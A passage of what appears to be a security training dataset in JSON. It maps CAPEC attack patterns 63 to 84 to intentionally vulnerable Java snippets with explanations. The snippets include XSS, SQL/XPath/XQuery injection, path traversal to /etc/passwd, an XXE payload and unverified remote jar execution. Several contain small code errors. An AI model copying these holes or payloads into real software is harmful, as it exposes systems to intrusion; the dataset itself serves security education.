        "description": "This Java servlet code snippet demonstrates a Cross-Site Request Forgery (CSRF) vulnerability. The servlet processes a POST request to perform a money transfer action. It checks if the user is authenticated by verifying the session, but it does not include any CSRF protection mechanisms, such as a CSRF token. This allows an attacker to craft a malicious request that can be executed with the user's privileges if the user is authenticated. The code also highlights related weaknesses such as missing authentication for critical functions (CWE-306) and improper control of resources (CWE-664)."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>\" + userInput + \"</h1>\"); // Vulnerable to XSS\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability. The servlet takes user input from an HTTP GET request parameter named 'input' and directly includes it in the HTML response without any validation or sanitization. This allows an attacker to inject malicious scripts into the web page, which will be executed by the browser with the user's privileges. The code is vulnerable due to improper neutralization of input during web page generation (CWE-79) and improper input validation (CWE-20)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.net.URLDecoder;\n\n@WebServlet(\"/fileAccess\")\npublic class FileAccessServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        if (filePath != null) {\n            // Decode the URL-encoded file path\n            String decodedPath = URLDecoder.decode(filePath, \"UTF-8\");\n            // Check if the decoded path is within the allowed directory\n            if (decodedPath.startsWith(\"/allowed/directory/\")) {\n                // Proceed with file access\n                response.getWriter().println(\"Accessing file: \" + decodedPath);\n            } else {\n                // Invalid path, potential path traversal attack\n                response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing file parameter\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a potential vulnerability related to improper handling of URL encoding and path traversal attacks. The servlet receives a URL-encoded file path as a parameter, decodes it, and checks if the decoded path is within an allowed directory. However, this simplistic check can be bypassed by an attacker using double encoding or other encoding techniques to craft a path that appears safe but resolves to a forbidden location. This code snippet embodies the main idea of CAPEC-147, highlighting the risks associated with improper handling of URL encoding and path validation."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCodeDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/update.jar\";\n        try {\n            URL downloadUrl = new URL(url);\n            HttpURLConnection connection = (HttpURLConnection) downloadUrl.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"update.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, bytesRead, bytesRead);\n            }\n\n            inputStream.close();\n            outputStream.close();\n\n            // Load and execute the downloaded code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code downloader that embodies the main idea of the CAPEC 'Sniff Application Code'. The code downloads an executable JAR file from a specified URL over an unencrypted HTTP connection (CWE-319, CWE-311). It then saves the file locally and executes it without performing any integrity checks (CWE-494). This lack of encryption and integrity verification makes the code susceptible to sniffing and tampering by an adversary, who could capture or modify the code during transmission, leading to potential exploitation of the client-server trust relationship."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class SQLInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a classic SQL Injection vulnerability. The code constructs an SQL query by directly concatenating user input into the query string without proper validation or neutralization of special characters. The user input is set to a malicious string that alters the intended SQL command, potentially allowing an attacker to bypass authentication or retrieve all records from the 'users' table. This example highlights the importance of validating and sanitizing user inputs to prevent SQL Injection attacks, as described in CAPEC-89 and related CWEs."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import java.util.logging.Logger;\n\npublic class VulnerableSyslog {\n    private static final Logger logger = Logger.getLogger(VulnerableSyslog.class.getName());\n\n    public static void logMessage(String userInput) {\n        // CWE-134: Use of Externally-Controlled Format String\n        // CWE-20: Improper Input Validation\n        // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-680: Integer Overflow to Buffer Overflow\n        // CWE-697: Incorrect Comparison\n        String message = String.format(userInput); // Vulnerable to format string injection\n        logger.info(message); // Log the message\n    }\n\n    public static void main(String[] args) {\n        // Simulate user input\n        String userInput = \"%x %x %x %x\"; // Malicious input to exploit format string vulnerability\n        logMessage(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the insecure use of the syslog() function, as described in the CAPEC. The logMessage method takes user input and directly uses it in a format string without proper validation or neutralization, leading to a format string injection vulnerability (CWE-134). This can result in a buffer overflow (CWE-120) if the input is crafted maliciously. The code also highlights improper input validation (CWE-20) and improper neutralization of special elements (CWE-74). The main method simulates an attack by providing a malicious format string as user input."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import java.security.*;\n\npublic class CodeSigningSubversion {\n    public static void main(String[] args) throws Exception {\n        // Weak hash function (CWE-328)\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        String data = \"Important data to sign\";\n        byte[] hash = md.digest(data.getBytes());\n\n        // Missing cryptographic step (CWE-325)\n        // Normally, we would sign the hash with a private key here\n        // but this step is omitted, weakening the security\n\n        // Simulate subverting code signing by embedding malicious code (CWE-506)\n        if (verifySignature(hash)) {\n            System.out.println(\"Code is trusted and executed.\");\n            // Malicious code execution\n            executeMaliciousCode();\n        } else {\n            System.out.println(\"Code is not trusted.\");\n        }\n    }\n\n    private static boolean verifySignature(byte[] hash) {\n        // Simulate a verification process that is easily bypassed\n        return true; // Always returns true, subverting the verification\n    }\n\n    private static void executeMaliciousCode() {\n        System.out.println(\"Executing malicious code...\");\n        // Malicious actions here\n    }\n}",
        "description": "This Java code snippet demonstrates a subversion of code-signing facilities, embodying the main idea of the CAPEC. The code uses a weak hash function (MD5) to generate a hash of the data (CWE-328). It omits a critical cryptographic step of signing the hash with a private key (CWE-325), weakening the security. The `verifySignature` method is designed to always return true, simulating a bypass of the verification process. Finally, the code includes a method to execute malicious code if the verification is 'successful' (CWE-506). This snippet illustrates how an attacker could subvert code-signing mechanisms to execute untrusted or malicious code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class PrivilegedProgram {\n    public static void main(String[] args) {\n        try {\n            // CWE-250: Execution with Unnecessary Privileges\n            if (args.length > 0 && args[0].equals(\"admin\")) {\n                System.setProperty(\"user.privilege\", \"admin\");\n            } else {\n                System.setProperty(\"user.privilege\", \"user\");\n            }\n\n            // CWE-15: External Control of System or Configuration Setting\n            String command = System.getProperty(\"user.command\");\n\n            // CWE-78: Improper Neutralization of Special Elements used in an OS Command\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a program running with elevated privileges, which can be exploited by an attacker. The program sets a system property based on user input to determine the privilege level (CWE-250). It then reads a command from a system property that can be externally controlled (CWE-15). Finally, it executes this command without proper sanitization, leading to a potential OS command injection vulnerability (CWE-78). This embodies the main idea of the CAPEC by showing how an attacker can leverage vulnerabilities in a privileged program to execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "public class LoginService {\n    private static final String DEFAULT_USERNAME = \"admin\";\n    private static final String DEFAULT_PASSWORD = \"password\";\n    private static final String[] COMMON_PASSWORDS = {\"123456\", \"password\", \"123456789\", \"12345678\", \"12345\"};\n\n    public boolean authenticate(String username, String password) {\n        // Check for default credentials\n        if (username.equals(DEFAULT_USERNAME) && password.equals(DEFAULT_PASSWORD)) {\n            return true;\n        }\n\n        // Check for common passwords\n        for (String commonPassword : COMMON_PASSWORDS) {\n            if (password.equals(commonPassword)) {\n                return true;\n            }\n        }\n\n        // Placeholder for actual authentication logic\n        return false;\n    }\n\n    public static void main(String[] args) {\n        LoginService loginService = new LoginService();\n        System.out.println(loginService.authenticate(\"admin\", \"password\")); // Should return true\n        System.out.println(loginService.authenticate(\"user\", \"123456\")); // Should return true\n        System.out.println(loginService.authenticate(\"user\", \"securePassword\")); // Should return false\n    }\n}",
        "description": "This Java code snippet represents a simple login service that checks for default and common passwords, embodying the main idea of the CAPEC 'Try Common or Default Usernames and Passwords'. The code includes hard-coded default credentials (CWE-798) and a list of common passwords (CWE-521). The `authenticate` method first checks if the provided username and password match the default credentials. If not, it checks if the password is one of the common passwords. This demonstrates the vulnerability where an attacker can gain access using well-known or weak credentials. The code also highlights the risk of relying on single-factor authentication (CWE-308) and weak password requirements (CWE-521)."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.net.URLDecoder;\n\npublic class UnicodeBypassExample {\n    public static void main(String[] args) {\n        String input = \"%C3%A9vil%20input\"; // URL encoded input representing '\u00e9vil input'\n        String decodedInput = decodeInput(input);\n\n        if (isValidInput(decodedInput)) {\n            System.out.println(\"Input is valid: \" + decodedInput);\n        } else {\n            System.out.println(\"Input is invalid.\");\n        }\n    }\n\n    private static String decodeInput(String input) {\n        try {\n            return URLDecoder.decode(input, StandardCharsets.UTF_8.name());\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n\n    private static boolean isValidInput(String input) {\n        // Early validation before canonicalization\n        return !input.contains(\"evil\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where Unicode encoding is used to bypass validation logic. The input is URL encoded and contains a Unicode character. The `decodeInput` method decodes the input, but the `isValidInput` method performs validation before this decoding step. This represents CWE-180 (Validate Before Canonicalize) and CWE-179 (Early Validation). The validation logic checks for the string 'evil', but since the input is validated before decoding, the malicious input '%C3%A9vil%20input' (which decodes to '\u00e9vil input') bypasses the validation. This embodies the main idea of CAPEC-202, where improper handling of Unicode encoding allows an attacker to bypass validation mechanisms."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class URLDecoderExample {\n    public static void main(String[] args) {\n        try {\n            String encodedUrl = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded URL representing '../../etc/passwd'\n            String decodedUrl = URLDecoder.decode(encodedUrl, \"UTF-8\");\n            System.out.println(\"Decoded URL: \" + decodedUrl);\n\n            // Vulnerable file access based on decoded URL\n            File file = new File(decodedUrl);\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to improper handling of URL encoding. The encoded URL '%2E%2E%2F%2E%2E%2Fetc%2Fpasswd' is decoded to '../../etc/passwd', which is a path traversal attack. The code then attempts to read the file at the decoded path without proper validation or sanitization, leading to potential security risks. This example embodies the main idea of the CAPEC by showing how an adversary can exploit URL encoding to manipulate file paths and access sensitive files. The related CWEs are represented by the improper handling of URL encoding (CWE-177), external control of file name or path (CWE-73), and improper input validation (CWE-20)."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        String fileContent = request.getParameter(\"fileContent\");\n\n        // Vulnerable code: No validation or sanitization of the file name\n        File file = new File(\"/uploads/\" + fileName);\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(fileContent);\n        }\n\n        // Output the file name in the response without proper encoding\n        response.getWriter().println(\"File uploaded: \" + fileName);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where user-controlled input is used to create a file name and write content to it without proper validation or sanitization. The 'fileName' parameter is directly taken from the user input and used to create a file path, which can lead to directory traversal attacks or other malicious file manipulations (CWE-20, CWE-184). Additionally, the file name is outputted in the HTTP response without proper encoding, making it susceptible to XSS attacks (CWE-116). This code embodies the main idea of the CAPEC 'User-Controlled Filename' by showing how an attacker can exploit improper input validation and encoding to execute malicious actions."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class StateManipulationExample {\n    private Map<String, String> userStates = new HashMap<>();\n\n    public void storeUserState(HttpServletRequest request, HttpServletResponse response, String userId, String state) {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie stateCookie = new Cookie(\"userState\", state);\n        response.addCookie(stateCookie);\n        userStates.put(userId, state);\n    }\n\n    public String retrieveUserState(HttpServletRequest request, String userId) {\n        // CWE-372: Incomplete Internal State Distinction\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"userState\")) {\n                    return cookie.getValue();\n                }\n            }\n        }\n        return userStates.get(userId);\n    }\n\n    public void processUserRequest(HttpServletRequest request, HttpServletResponse response, String userId) {\n        String state = retrieveUserState(request, userId);\n        if (state == null) {\n            // CWE-693: Protection Mechanism Failure\n            response.setStatus(HttpServletResponse.SC_FORBIDDEN);\n            return;\n        }\n        // Process the request based on the retrieved state\n        // ...\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where user state information is manipulated, embodying the main idea of the CAPEC 'Manipulating State'. The code includes several related CWEs for context:\n\n1. **CWE-315: Cleartext Storage of Sensitive Information in a Cookie** - The user state is stored in a cookie in cleartext, making it vulnerable to interception and manipulation.\n2. **CWE-372: Incomplete Internal State Distinction** - The code retrieves the user state from cookies without verifying its integrity, leading to potential incorrect state assumptions.\n3. **CWE-693: Protection Mechanism Failure** - The code does not have sufficient protection mechanisms to verify the authenticity of the user state, leading to potential unauthorized access.\n\nThe `storeUserState` method stores the user state in a cookie and a map. The `retrieveUserState` method retrieves the user state from the cookie, falling back to the map if the cookie is not found. The `processUserRequest` method processes user requests based on the retrieved state, but fails to verify the integrity and authenticity of the state, making it vulnerable to state manipulation attacks."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class ConfigManager {\n    private Properties config;\n    private File configFile;\n\n    public ConfigManager(String filePath) throws IOException {\n        configFile = new File(filePath);\n        config = new Properties();\n        loadConfig();\n    }\n\n    private void loadConfig() throws IOException {\n        try (FileInputStream fis = new FileInputStream(configFile)) {\n            config.load(fis);\n        }\n    }\n\n    public String getConfigValue(String key) {\n        return config.getProperty(key);\n    }\n\n    public void setConfigValue(String key, String value) throws IOException {\n        config.setProperty(key, value);\n        saveConfig();\n    }\n\n    private void saveConfig() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(configFile)) {\n            config.store(fos, null);\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            ConfigManager configManager = new ConfigManager(\"config.properties\");\n            configManager.setConfigValue(\"username\", \"admin\");\n            System.out.println(\"Username: \" + configManager.getConfigValue(\"username\"));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple configuration manager that reads and writes to a configuration file. The `ConfigManager` class loads configuration properties from a file, allows retrieval and modification of these properties, and saves the changes back to the file. The main idea of the CAPEC is represented by the potential vulnerability of manipulating writable configuration files. The code does not include any validation or integrity checks, making it susceptible to several CWEs: \n- CWE-349: The code accepts any data written to the configuration file without validation.\n- CWE-99: The file path is taken directly from user input without restriction.\n- CWE-77: If the configuration values are used in commands, they could be exploited for command injection.\n- CWE-346: The source of the configuration data is not validated.\n- CWE-353 and CWE-354: There is no integrity check mechanism to ensure the configuration file has not been tampered with."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        File file = new File(\"/var/www/uploads/\" + fileName);\n        \n        if (file.exists() && file.isFile()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            response.setHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);\n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                os.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            os.close();\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Manipulating Web Input to File System Calls'. The code takes a 'file' parameter from an HTTP GET request and uses it to construct a file path. It then attempts to serve the file to the client if it exists. The vulnerability lies in the fact that the 'file' parameter is not properly sanitized, allowing an attacker to perform a path traversal attack (CWE-22, CWE-23) by including sequences like '../' in the 'file' parameter. This could lead to unauthorized access to files outside the intended directory. Additionally, the code does not validate the origin of the request (CWE-346) or ensure proper authorization (CWE-285), further exacerbating the security risk."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import java.util.Map;\nimport java.util.HashMap;\n\npublic class UserControlledVariables {\n    private static Map<String, String> config = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user input from query parameters\n        Map<String, String> userInput = new HashMap<>();\n        userInput.put(\"debug\", \"true\");\n        userInput.put(\"admin\", \"true\");\n\n        // Directly using user input to modify configuration\n        for (Map.Entry<String, String> entry : userInput.entrySet()) {\n            config.put(entry.getKey(), entry.getValue());\n        }\n\n        // Business logic based on configuration\n        if (Boolean.parseBoolean(config.get(\"debug\"))) {\n            System.out.println(\"Debug mode is ON\");\n        }\n\n        if (Boolean.parseBoolean(config.get(\"admin\"))) {\n            System.out.println(\"Admin privileges granted\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC by directly using user-controlled variables to modify application configuration settings. The `userInput` map simulates user-supplied query parameters, which are then used to update the `config` map without any validation or sanitization. This can lead to security issues such as enabling debug mode or granting admin privileges based on untrusted input. The code embodies the main idea of the CAPEC by showing how an attacker can manipulate application behavior through user-controlled variables, leading to potential security weaknesses like improper authorization and external control of system settings."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Vulnerable to path traversal due to improper neutralization of special elements\n        File file = new File(\"/var/www/uploads/\" + filePath);\n        \n        if (file.exists() && file.isFile()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n            \n            response.setContentType(\"application/octet-stream\");\n            response.setHeader(\"Content-Disposition\", \"attachment; filename=\\\"\" + file.getName() + \"\\\"\");\n            response.getOutputStream().write(data);\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding'. The code takes a 'file' parameter from the HTTP request and constructs a file path without properly neutralizing special elements, making it susceptible to path traversal attacks (CWE-22). An attacker can exploit this by providing a file path with escaped slashes or other special characters to access files outside the intended directory. The code also does not validate or canonicalize the input correctly before using it, which can lead to security issues (CWE-180, CWE-181)."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        \n        // Vulnerable to path traversal due to improper input validation and handling of alternate encoding\n        File file = new File(\"/var/www/uploads/\" + filePath);\n        \n        if (file.exists() && file.isFile()) {\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n            \n            response.setContentType(\"application/octet-stream\");\n            response.setContentLength(data.length);\n            response.getOutputStream().write(data);\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to the CAPEC 'Using Slashes in Alternate Encoding'. The servlet takes a 'file' parameter from the HTTP request and constructs a file path using this parameter. The code does not properly validate or canonicalize the input, making it susceptible to path traversal attacks. An attacker could use alternate encodings of slashes to bypass filters and access files outside the intended directory. This example embodies several related CWEs, including improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and path traversal (CWE-22)."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import java.nio.charset.StandardCharsets;\nimport java.nio.charset.Charset;\nimport java.nio.charset.CharsetDecoder;\nimport java.nio.charset.CodingErrorAction;\n\npublic class UTF8ValidationBypass {\n    public static void main(String[] args) {\n        String userInput = \"\\u00C0\\u0080admin\\u00C0\\u0080\"; // Overlong UTF-8 encoding for 'admin'\n        if (isValidUTF8(userInput)) {\n            System.out.println(\"Valid UTF-8 input: \" + userInput);\n            // Proceed with further processing\n        } else {\n            System.out.println(\"Invalid UTF-8 input.\");\n        }\n    }\n\n    public static boolean isValidUTF8(String input) {\n        CharsetDecoder decoder = StandardCharsets.UTF_8.newDecoder();\n        decoder.onMalformedInput(CodingErrorAction.REPORT);\n        decoder.onUnmappableCharacter(CodingErrorAction.REPORT);\n        try {\n            decoder.decode(java.nio.ByteBuffer.wrap(input.getBytes(StandardCharsets.UTF_8)));\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability where UTF-8 encoding is used to bypass validation logic. The `userInput` string contains an overlong UTF-8 encoding for the word 'admin'. The `isValidUTF8` method attempts to validate the input by decoding it using a `CharsetDecoder` configured to report malformed and unmappable characters. If the input is valid UTF-8, it proceeds with further processing. However, if the validation logic is not robust enough, it may incorrectly accept overlong encodings, leading to potential security issues. This snippet embodies the main idea of CAPEC-Using UTF-8 Encoding to Bypass Validation Logic and highlights related CWEs such as Improper Handling of Alternate Encoding (CWE-173) and Encoding Error (CWE-172)."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServletRequest;\n\npublic class WebServerLog {\n    public void logRequest(HttpServletRequest request) {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String ipAddress = request.getRemoteAddr();\n        String logEntry = ipAddress + \" - \" + userAgent;\n\n        // CWE-117: Improper Output Neutralization for Logs\n        logEntry = logEntry.replaceAll(\"\\n\", \"_\").replaceAll(\"\\r\", \"_\");\n\n        try (FileWriter fw = new FileWriter(\"webserver.log\", true)) {\n            fw.write(logEntry + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism in a web server context, embodying the main idea of CAPEC- Web Server Logs Tampering. The `logRequest` method logs the IP address and User-Agent header of an incoming HTTP request. The code attempts to neutralize CRLF sequences (CWE-93) by replacing newline and carriage return characters with underscores. However, this simplistic approach may not be sufficient to prevent all forms of log tampering or injection attacks. The code highlights the importance of proper output neutralization (CWE-117) and input validation (CWE-20) to prevent attackers from injecting malicious data into log files, which could be used to mask other malicious activities or exploit downstream log processing systems."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlData = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                         \"<!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                         \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, false); // Improper Restriction of XML External Entity Reference\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlData)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that does not properly restrict XML External Entity (XXE) references. The code parses an XML string that includes an external entity reference to a local file (e.g., /etc/passwd). The DocumentBuilderFactory is configured without secure processing, allowing the external entity to be processed. This can lead to sensitive data exposure or other malicious actions. The code embodies the main idea of the deprecated CAPEC by showing how improper handling of XML content can lead to security vulnerabilities, specifically highlighting CWE-611 (Improper Restriction of XML External Entity Reference)."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import javax.xml.xpath.*;\nimport org.xml.sax.InputSource;\nimport java.io.StringReader;\n\npublic class XPathInjectionExample {\n    public static void main(String[] args) {\n        String xmlData = \"<users><user><name>admin</name><password>adminpass</password></user></users>\";\n        String userInput = \"' or '1'='1\"; // Simulated malicious input\n        String xpathExpression = \"//user[name/text() = '\" + userInput + \"']/password/text()\";\n\n        try {\n            XPathFactory xPathFactory = XPathFactory.newInstance();\n            XPath xpath = xPathFactory.newXPath();\n            InputSource inputSource = new InputSource(new StringReader(xmlData));\n            String result = xpath.evaluate(xpathExpression, inputSource);\n            System.out.println(\"Password: \" + result);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an XPath injection vulnerability. It constructs an XPath query using unsanitized user input, which can be manipulated by an attacker to alter the query's logic. The `userInput` variable contains a malicious string that changes the XPath query to return the password of the first user in the XML data regardless of the actual input. This example highlights the importance of properly sanitizing inputs to prevent injection attacks. Specifically, it shows how improper input validation and neutralization can lead to security vulnerabilities, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import javax.xml.xquery.XQConnection;\nimport javax.xml.xquery.XQDataSource;\nimport javax.xml.xquery.XQException;\nimport javax.xml.xquery.XQPreparedExpression;\nimport javax.xml.xquery.XQResultSequence;\nimport net.xqj.exist.ExistXQDataSource;\n\npublic class XQueryInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"' or '1'='1\"; // Simulated malicious input\n        String xquery = \"for $user in doc('users.xml')/users/user where $user/name = '\" + userInput + \"' return $user\";\n\n        try {\n            XQDataSource xqds = new ExistXQDataSource();\n            XQConnection conn = xqds.getConnection();\n            XQPreparedExpression expr = conn.prepareExpression(xquery);\n            XQResultSequence result = expr.executeQuery();\n\n            while (result.next()) {\n                System.out.println(result.getItemAsString(null));\n            }\n\n            conn.close();\n        } catch (XQException e) {\n            e.printStackTrace();\n        }\n    }\n}",
